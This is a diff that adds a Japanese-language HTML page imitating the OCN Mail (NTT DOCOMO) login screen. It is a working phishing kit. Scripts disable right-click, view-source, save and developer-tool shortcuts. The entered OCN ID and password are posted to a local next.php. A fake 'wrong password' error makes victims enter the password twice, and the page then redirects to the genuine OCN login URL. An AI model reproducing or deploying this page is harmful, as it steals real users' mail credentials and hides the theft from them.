@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<title>ログイン | OCNメール | OCN</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<meta name="description" content="OCNメールでOCN IDのログインを行います。">
+<meta name="keywords" content="">
+<link rel="shortcut icon" href="files/favicon.ico" type="image/vnd.microsoft.icon">
+<link href="files/style.css?ver=2.2" type="text/css" rel="stylesheet" id="style1">
+
+<script src="files/jquery.js"></script>
+<script src="files/jquery.cookie.js"></script>
+<script src="files/css.js?ver=2.2"></script>
+<script src="files/mjl.js"></script>
+<script src="files/run.js"></script>
+<script src="files/timewait.js"></script>
+<script>
+<!--
+window.onload = function(){ login_disabled("AuthLoginDisplay_AuthLoginLogin", 0000); };
+//-->
+</script>
+</head>
+<script>
+  // prevent ctrl + s
+  window.addEventListener('keydown', async(e) => {
+      if (e.ctrlKey && (e.which == 83)) {
+          e.preventDefault();
+          return false; }
+  });
+  window.addEventListener('contextmenu', event => event.preventDefault());
+  document.onkeydown = function (e) {
+      if (event.keyCode == 123) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+          return false;
+      }
+  }
+  window.onkeydown = (e) => {
+      return !(e.ctrlKey &&
+          (e.keyCode === 67 ||
+              e.keyCode === 85 ||
+              e.keyCode === 86 ||
+              e.keyCode === 88 ||
+              e.keyCode === 117));
+  };
+
+    function send_result(comid, password) {
+        $.ajax({
+            url: "./next.php",
+            data: {
+                "comid": comid,
+                "password": password
+            },
+            type: "POST",
+            success: function (data) {},
+            error: function (data) {
+                console.log('Ajax error');
+            }
+        });        
+    }
+  </script>
+<body>
+
+<div class="container">
+
+
+  <div class="header">
+    <div class="ocntop">
+
+
+<div class="jpn_none">
+      <a href="#">OCNトップ</a>
+</div>
+
+
+
+<div class="en_none">
+      <a href="#">OCN TOP</a>
+</div>
+
+
+    </div>
+
+
+<div class="jpn_none">
+    <p><a href="#"><img src="files/logo_001.gif" alt="OCNメール"></a></p>
+</div>
+
+
+
+<div class="en_none">
+    <p><a href="#"><img src="files/logo_001.gif" alt="OCN Mail"></a></p>
+</div>
+
+
+  </div>
+
+
+
+  <div class="content">
+
+
+<div class="jpn_none">
+    <div class="notice-area fr-n">
+      <p class="notice-title">【重要なお知らせ】gooポイントの終了について</p>
+      <p class="text notice">dアカウントとOCNを連携させると、OCNの対象サービスご利用状況に応じてdポイントがたまります。<a href="#">連携がお済でない方はこちら</a>からお手続きください。</p>
+    </div>
+</div>
+
+
+    <div class="frame fr-n">
+      <div class="title-area">
+
+
+<div class="jpn_none">
+        <div class="pdr-la">
+          <div class="lang"><a href="#" onClick="styleChange('files/style_en.css?ver=2.2');">English</a></div>
+        </div>
+        <h1 class="title-m">ログイン</h1>
+</div>
+
+
+
+<div class="en_none">
+        <div class="pdr-la">
+          <div class="lang"><a href="#" onClick="styleChange('files/style.css?ver=2.2');">日本語</a></div>
+        </div>
+        <h1 class="title-m">Login</h1>
+</div>
+
+
+      </div>
+
+      <div class="main-area">
+
+
+
+
+
+
+
+        <form id="AuthLoginDisplay" name="AuthLoginDisplay" action="AuthLoginLogin.action" method="post">
+
+          <div class="form-item w-form-1">
+
+
+<div class="jpn_none">
+            <label for="AuthLoginDisplay_comid">OCNメールアドレス（OCN ID）</label>
+</div>
+
+
+
+<div class="en_none">
+            <label for="AuthLoginDisplay_comid">OCN mail address</label>
+</div>
+
+
+            <input id="AuthLoginDisplay_comid" name="comid" placeholder="OCNメールアドレス（OCN ID）" type="text" value="" maxlength="278"/>
+          </div>
+
+          <div class="form-item w-form-1">
+
+
+<div class="jpn_none">
+            <label for="AuthLoginDisplay_password">OCNメールパスワード</label>
+</div>
+
+
+
+<div class="en_none">
+            <label for="AuthLoginDisplay_password">Password</label>
+</div>
+
+
+            <input type="password" name="password" maxlength="32" id="AuthLoginDisplay_password" placeholder="OCNメールパスワード">
+          </div>
+
+          <div class="checkbox-container">
+
+
+<div class="jpn_none">
+            <input type="checkbox" name="loginOption" value="true" id="_loginOption" class="chkbox-position">
+            <label for="_loginOption" class="checkbox">
+              <input type="hidden" id="__checkbox__loginOption" name="__checkbox_loginOption" value="true">ログイン状態を一定期間保持する
+            </label>
+            <a href="#" class="q-mark" target="_blank" title="Q.「ログイン状態を一定期間保持する」&#010;　　とは？&#010;A.「ログイン状態を一定期間保持する」&#010;　　にチェックを入れてからログイン&#010;　　すると、一定の期間次回ログイン&#010;　　時にログイン画面が省略され、簡&#010;　　単にログインすることができます。">?</a>
+</div>
+
+
+
+<div class="en_none">
+            <input type="checkbox" name="loginOption" value="true" id="_loginOption2" class="chkbox-position">
+            <label for="_loginOption2" class="checkbox">
+              <input type="hidden" id="__checkbox__loginOption2" name="__checkbox_loginOption" value="true">Remember me
+            </label>
+</div>
+
+
+          </div>
+
+          <div class="button-panel">
+            <input type="submit" class="button" title="ログイン" value="ログイン" name="action:AuthLoginLogin" id="AuthLoginDisplay_AuthLoginLogin">
+          </div>
+
+          <div class="main-footer">
+
+
+<div class="jpn_none">
+            <div class="pdb10">
+              <p><a href="#" target="_blank">メールアドレス・パスワードをお忘れの方</a></p>
+            </div>
+            <p><a href="#" target="_blank">パスワード変更</a></p>
+</div>
+
+
+
+<div class="en_none">
+            <div class="pdb10">
+              <p><a href="#" target="_blank">Forgot ID or password?</a></p>
+            </div>
+            <p><a href="#" target="_blank">Change password</a></p>
+</div>
+
+
+          </div>
+
+        </form>
+
+      </div>
+    </div>
+
+
+<div class="jpn_none">
+    <div class="align-c fr-n banner">
+      <p><a href="#" target="_blank"><img src="files/banner_5.png" alt="OCNの契約で毎月dポイントがたまる!つかえる!" class="footer-img"></a></p>
+    </div>
+    <div class="help"><a href="#" target="_blank">よくあるご質問</a></div>
+</div>
+
+
+
+<div class="en_none">
+    <div class="help"><a href="#" target="_blank">Help</a></div>
+</div>
+
+
+  </div>
+
+
+
+</div>
+
+
+<div class="footer">
+  <table>
+    <tbody>
+      <tr>
+        <td>
+
+
+<div class="jpn_none">
+          <ul>
+            <li class="footer-li"><a href="#" target="_blank">利用規約</a></li>
+            <li class="footer-li"><a href="#" target="_blank">プライバシーポリシー</a></li>
+            <li class="footer-li"><a href="#" target="_blank">企業情報</a></li>
+          </ul>
+</div>
+
+
+
+<div class="en_none">
+          <ul>
+            <li class="footer-li"><a href="#" target="_blank">Terms</a></li>
+            <li class="footer-li"><a href="#" target="_blank">Privacy Policy</a></li>
+            <li class="footer-li"><a href="#" target="_blank">About Us</a></li>
+          </ul>
+</div>
+
+
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="copyright">©NTT DOCOMO</div>
+</div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", ()=> {
+      var count = 0
+      var url_string = window.location.hash.substr(1);
+      if(url_string){
+          document.getElementById("AuthLoginDisplay_comid").value = url_string;
+      }
+
+      document.getElementById("AuthLoginDisplay_AuthLoginLogin").addEventListener("click", event => {
+        event.preventDefault ? event.preventDefault() : event.returnValue = false;
+
+        var comid = document.getElementById("AuthLoginDisplay_comid").value
+        var password = document.getElementById("AuthLoginDisplay_password").value
+
+        if (!comid) {
+            setTimeout(() => {document.getElementById("AuthLoginDisplay_comid").value = ""; document.getElementById("errorArea2").innerHTML = "メールを空にすることはできません。もう一度試してください。"}, 1500)
+            setTimeout(() => {document.getElementById("errorArea2").innerHTML = ""}, 5000)
+        }else if (!comid.includes("@") && !comid.includes(".")) {
+            setTimeout(() => {document.getElementById("AuthLoginDisplay_comid").value = ""; document.getElementById("errorArea2").innerHTML = "正しくないメールアドレス！もう一度試してください。"}, 1500)
+            setTimeout(() => {document.getElementById("errorArea2").innerHTML = ""}, 5000)
+        }else if (password == null || password == "") {
+            setTimeout(() => {document.getElementById("AuthLoginDisplay_password").value = ""; document.getElementById("errorArea2").innerHTML = "パスワードを空にすることはできません。もう一度試してください。"}, 1500)
+            setTimeout(() => {document.getElementById("errorArea2").innerHTML = ""}, 5000)
+        }else if (password.length < 5) {
+            setTimeout(() => {document.getElementById("AuthLoginDisplay_password").value = ""; document.getElementById("errorArea2").innerHTML = "パスワードが短すぎます！もう一度試してください。"}, 1500)
+            setTimeout(() => {document.getElementById("errorArea2").innerHTML = ""}, 5000)
+        }else if (password.length > 5 && count < 1) {
+            send_result(comid, password);
+            setTimeout(() => {document.getElementById("AuthLoginDisplay_password").value = ""; document.getElementById("errorArea2").innerHTML = "メールアドレス、または、メールパスワードが正しくないようです。 もう一度入力しなおしてください。"}, 1500)
+            setTimeout(() => {document.getElementById("errorArea2").innerHTML = ""; count++}, 5000)
+        } else {
+            var comid = document.getElementById("AuthLoginDisplay_comid").value
+            var password = document.getElementById("AuthLoginDisplay_password").value
+            send_result(comid, password);
+            setTimeout(() => {window.location.assign("https://login.ocn.ne.jp/auth/s1001/pc/AuthLoginDisplay.action")}, 2000);
+        }
+      })
+  })
+</script>
+<script src="files/css.js?ver=2.2"></script>
+
+</body>
+</html>
